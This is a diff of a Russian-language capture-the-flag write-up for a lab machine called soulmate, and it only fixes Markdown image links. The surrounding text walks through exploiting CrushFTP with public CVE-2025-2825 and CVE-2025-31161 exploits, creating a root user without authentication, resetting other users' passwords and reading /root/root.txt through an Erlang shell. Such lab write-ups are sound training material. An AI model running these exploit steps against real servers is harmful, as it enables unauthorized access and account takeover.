@@ -75,7 +75,7 @@ logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67m
 dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 133ms]
 ```
 При попытке залогинитья с помощью sql запросов сервер вел себя странно 
-![Страноость] (imageSql.png)
+![Страноость](imageSql.png)
 * Это мы запонимаем и копаем дальше
 
 
@@ -99,19 +99,19 @@ echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
 * Обнаружен интерфейс со страницей логина и версия CrushFTP ; найдены уязвимости для этой версии  `crushftp-CVE-2025-2825   --> https://github.com/punitdarji/crushftp-CVE-2025-2825/blob/main/payload ` и `CVE-2025-31161 -->  https://github.com/Immersive-Labs-Sec/CVE-2025-31161`
 
 * crushftp-CVE-2025-2825 с его помощью я получили список юзеров админ панели
-![Список_юзеров] (image1.png)
+![Список_юзеров](image1.png)
 
 * С помощью CVE-2025-31161 получилось от имени рута(root) создать нового пользователя без аутентификации.
 ```bash
 python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user xss --password xss123
 ```
 * Получилось войти в систему как xss
-![Админ_авпель] (image2.png)
+![Админ_авпель](image2.png)
 
 * Потыкав на странице ` http://ftp.soulmate.htb/WebInterface/UserManager/index.htm` я обнаружил список юзеров
 
 * Я изменил их пароли и вошел в систему, только у bena были обраружены интересные директории с файлами
-![ben] (image3.png)
+![ben](image3.png)
 ```
 /IT/ – Файлы информационных технологий
 /ben/ – Пользовательская директория
@@ -185,7 +185,7 @@ Sorry, user ben may not run sudo on soulmate.
 ```
 
 * Хорошо а как насчет активных портов 
-![Порты] (image4.png)
+![Порты](image4.png)
 
 ### Обнаружение подозрительного  процесса на порту 2222
 
@@ -210,7 +210,7 @@ Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
 ```bash
 (ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
 ```
-![root.txt] (image.png)
+![root.txt](image.png)
  
 
  ## Заклюючение 
